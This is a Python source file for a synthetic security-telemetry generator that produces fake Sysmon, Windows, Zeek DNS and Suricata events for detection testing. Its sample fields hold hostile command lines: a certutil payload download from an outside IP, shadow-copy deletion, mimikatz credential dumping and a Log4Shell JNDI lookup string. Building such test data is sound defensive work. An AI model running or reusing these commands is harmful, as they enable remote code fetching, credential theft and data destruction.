"""
SentinelAI - Multi-Source Synthetic Telemetry Generator
Generates enterprise-grade, realistic cybersecurity log streams across:
- Windows Security Event Logs (EID 4624, 4625, 4672, 4720, 7045)
- Sysmon (EID 1 Process Create, EID 3 Network Connect, EID 7 Image Load, EID 10 Process Access)
- Zeek Network Telemetry (DNS, HTTP, SSL, Conn, Notice)
- Suricata EVE JSON IDS Alerts & Flow Records
- Linux Auth & Auditd Logs (sshd, sudo, useradd, PAM)
- Next-Gen Firewall (Palo Alto / Cisco ASA) traffic logs
"""

from __future__ import annotations

import json
import random
import uuid
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional


class TelemetryGenerator:
    """
    High-fidelity deterministic and stochastic security log synthesizer
    for SOC simulation, ML training validation, and threat detection pipeline testing.
    """

    USERNAMES = [
        "svc_backup_admin", "svc_sql_prod", "svc_iis_app", "finance_dir",
        "jdoe", "asmith", "bclarke", "mwilliams", "rjohnson", "admin_sec"
    ]

    HOSTNAMES = [
        "srv-ad-dc01.corp.local", "srv-db-prod01.corp.local", "srv-web-gw01.dmz",
        "ws-fin-042.corp.local", "ws-eng-108.corp.local", "ws-exec-007.corp.local",
        "vpn-gw01.perimeter.corp", "proxy-fw-edge.perimeter"
    ]

    INTERNAL_IPS = [
        "10.0.1.5", "10.0.1.10", "10.0.2.45", "10.0.3.112",
        "10.0.4.88", "10.0.5.210", "172.16.10.4", "192.168.1.100"
    ]

    EXTERNAL_MALICIOUS_IPS = [
        "198.51.100.42", "203.0.113.88", "185.220.101.5", "45.154.255.89",
        "91.240.118.172", "194.26.29.114", "103.145.13.2"
    ]

    PROCESS_NAMES = [
        ("cmd.exe", "C:\\Windows\\System32\\cmd.exe", "cmd.exe /c whoami /priv"),
        ("powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgA..."),
        ("certutil.exe", "C:\\Windows\\System32\\certutil.exe", "certutil.exe -urlcache -split -f http://198.51.100.42/payload.bin C:\\Temp\\p.bin"),
        ("rundll32.exe", "C:\\Windows\\System32\\rundll32.exe", "rundll32.exe C:\\Temp\\p.bin,DllRegisterServer"),
        ("vssadmin.exe", "C:\\Windows\\System32\\vssadmin.exe", "vssadmin.exe delete shadows /all /quiet"),
        ("mimikatz.exe", "C:\\Users\\Public\\mimikatz.exe", "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit"),
        ("svchost.exe", "C:\\Windows\\System32\\svchost.exe", "svchost.exe -k netsvcs -p -s BITS"),
        ("explorer.exe", "C:\\Windows\\explorer.exe", "C:\\Windows\\Explorer.EXE")
    ]

    ATTACK_SCENARIOS = [
        "BENIGN_NORMAL_ACTIVITY",
        "KERBEROASTING_ATTACK",
        "MIMIKATZ_CREDENTIAL_DUMP",
        "LOG4SHELL_EXPLOIT_ATTEMPT",
        "RANSOMWARE_VSS_DESTRUCTION",
        "DNS_TUNNELING_DATA_EXFIL",
        "BRUTE_FORCE_SSH_SPRAY",
        "SUSPICIOUS_POWERSHELL_DOWNLOAD"
    ]

    def __init__(self, seed: Optional[int] = 42):
        if seed is not None:
            random.seed(seed)

    def generate_sysmon_event(
        self,
        event_id: int = 1,
        scenario: str = "BENIGN_NORMAL_ACTIVITY",
        timestamp: Optional[datetime] = None
    ) -> Dict[str, Any]:
        """Generate Sysmon event (EID 1: Process Creation, EID 3: Network Connect, etc.)."""
        ts = timestamp or datetime.utcnow()
        user = random.choice(self.USERNAMES)
        host = random.choice(self.HOSTNAMES)
        
        if scenario == "MIMIKATZ_CREDENTIAL_DUMP":
            proc, path, cmd = self.PROCESS_NAMES[5]
            parent_proc = "powershell.exe"
        elif scenario == "RANSOMWARE_VSS_DESTRUCTION":
            proc, path, cmd = self.PROCESS_NAMES[4]
            parent_proc = "cmd.exe"
        elif scenario == "SUSPICIOUS_POWERSHELL_DOWNLOAD":
            proc, path, cmd = self.PROCESS_NAMES[1]
            parent_proc = "explorer.exe"
        else:
            proc, path, cmd = random.choice(self.PROCESS_NAMES)
            parent_proc = "explorer.exe"

        return {
            "source_type": "SYSMON_EVTX",
            "event_id": event_id,
            "timestamp": ts.isoformat() + "Z",
            "computer_name": host,
            "user": f"CORP\\{user}",
            "process_id": random.randint(1024, 65535),
            "process_name": proc,
            "image_path": path,
            "command_line": cmd,
            "parent_process_name": parent_proc,
            "hashes": f"SHA256={uuid.uuid4().hex.upper()}{uuid.uuid4().hex.upper()}",
            "scenario": scenario
        }

    def generate_windows_security_event(
        self,
        event_id: int = 4624,
        scenario: str = "BENIGN_NORMAL_ACTIVITY",
        timestamp: Optional[datetime] = None
    ) -> Dict[str, Any]:
        """Generate Windows Security Log (EID 4624 Logon, 4625 Failed Logon, 4672 Privileges)."""
        ts = timestamp or datetime.utcnow()
        user = random.choice(self.USERNAMES)
        host = random.choice(self.HOSTNAMES)
        src_ip = random.choice(self.EXTERNAL_MALICIOUS_IPS) if scenario == "BRUTE_FORCE_SSH_SPRAY" else random.choice(self.INTERNAL_IPS)

        is_failed = (event_id == 4625 or scenario == "BRUTE_FORCE_SSH_SPRAY")
        eid = 4625 if is_failed else event_id

        return {
            "source_type": "WINDOWS_SECURITY_EVTX",
            "event_id": eid,
            "timestamp": ts.isoformat() + "Z",
            "computer_name": host,
            "target_user_name": user,
            "target_domain_name": "CORP",
            "logon_type": 10 if src_ip in self.EXTERNAL_MALICIOUS_IPS else 3,  # 10=RemoteInteractive, 3=Network
            "ip_address": src_ip,
            "ip_port": random.randint(49152, 65535),
            "status": "0xC000006D" if is_failed else "0x0",
            "sub_status": "0xC000006A" if is_failed else "0x0",
            "auth_package": "NTLM V2" if scenario == "KERBEROASTING_ATTACK" else "Kerberos",
            "scenario": scenario
        }

    def generate_zeek_dns_log(
        self,
        scenario: str = "BENIGN_NORMAL_ACTIVITY",
        timestamp: Optional[datetime] = None
    ) -> Dict[str, Any]:
        """Generate Zeek DNS protocol log."""
        ts = timestamp or datetime.utcnow()
        src_ip = random.choice(self.INTERNAL_IPS)
        
        if scenario == "DNS_TUNNELING_DATA_EXFIL":
            query = f"{uuid.uuid4().hex[:16]}.{uuid.uuid4().hex[:16]}.c2-tunnel.cozybear-apt29.ru"
            answers = ["198.51.100.42"]
            qtype = "TXT"
        else:
            domain = random.choice(["api.github.com", "login.microsoftonline.com", "update.windows.com", "internal-portal.corp"])
            query = domain
            answers = [random.choice(self.INTERNAL_IPS)]
            qtype = "A"

        return {
            "source_type": "ZEEK_DNS",
            "timestamp": ts.isoformat() + "Z",
            "uid": f"C{uuid.uuid4().hex[:16].upper()}",
            "id.orig_h": src_ip,
            "id.orig_p": random.randint(1024, 65535),
            "id.resp_h": "10.0.1.5",  # Internal DNS Server
            "id.resp_p": 53,
            "proto": "udp",
            "query": query,
            "qtype_name": qtype,
            "rcode_name": "NOERROR",
            "answers": answers,
            "entropy": 4.85 if scenario == "DNS_TUNNELING_DATA_EXFIL" else 2.15,
            "scenario": scenario
        }

    def generate_suricata_eve_json(
        self,
        scenario: str = "LOG4SHELL_EXPLOIT_ATTEMPT",
        timestamp: Optional[datetime] = None
    ) -> Dict[str, Any]:
        """Generate Suricata EVE JSON IDS alert record."""
        ts = timestamp or datetime.utcnow()
        src_ip = random.choice(self.EXTERNAL_MALICIOUS_IPS)
        dest_ip = random.choice(self.INTERNAL_IPS)

        if scenario == "LOG4SHELL_EXPLOIT_ATTEMPT":
            signature = "ET EXPLOIT Apache log4j RCE Attempt (CVE-2021-44228) JNDI Lookup"
            sid = 2034647
            payload = "${jndi:ldap://198.51.100.42:1389/Exploit}"
            category = "Attempted Administrator Privilege Gain"
            severity = 1
        else:
            signature = "SURICATA STREAM 3way handshake SYNACK with wrong ack"
            sid = 2210044
            payload = ""
            category = "Generic Protocol Command Decode"
            severity = 3

        return {
            "source_type": "SURICATA_EVE_JSON",
            "timestamp": ts.isoformat() + "Z",
            "event_type": "alert",
            "src_ip": src_ip,
            "src_port": random.randint(1024, 65535),
            "dest_ip": dest_ip,
            "dest_port": 8080 if scenario == "LOG4SHELL_EXPLOIT_ATTEMPT" else 443,
            "proto": "TCP",
            "alert": {
                "action": "allowed",
                "gid": 1,
                "signature_id": sid,
                "rev": 1,
                "signature": signature,
                "category": category,
                "severity": severity,
                "metadata": {"mitre_technique_id": ["T1190"]}
            },
            "http": {
                "hostname": "payment-api.corp.internal",
                "url": "/api/v1/checkout",
                "http_user_agent": payload if payload else "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
            },
            "scenario": scenario
        }

    def generate_telemetry_batch(
        self,
        count: int = 50,
        include_attacks: bool = True
    ) -> List[Dict[str, Any]]:
        """Generate a mixed realistic sequence of security events across multiple protocols."""
        events = []
        now = datetime.utcnow()

        for i in range(count):
            event_time = now - timedelta(seconds=(count - i) * 15)
            
            if include_attacks and (i % 7 == 0):
                scenario = random.choice(self.ATTACK_SCENARIOS[1:])
            else:
                scenario = "BENIGN_NORMAL_ACTIVITY"

            log_type = random.choice(["sysmon", "windows", "zeek", "suricata"])
            
            if log_type == "sysmon":
                ev = self.generate_sysmon_event(event_id=1, scenario=scenario, timestamp=event_time)
            elif log_type == "windows":
                ev = self.generate_windows_security_event(event_id=4624, scenario=scenario, timestamp=event_time)
            elif log_type == "zeek":
                ev = self.generate_zeek_dns_log(scenario=scenario, timestamp=event_time)
            else:
                ev = self.generate_suricata_eve_json(scenario=scenario, timestamp=event_time)

            events.append(ev)

        return events
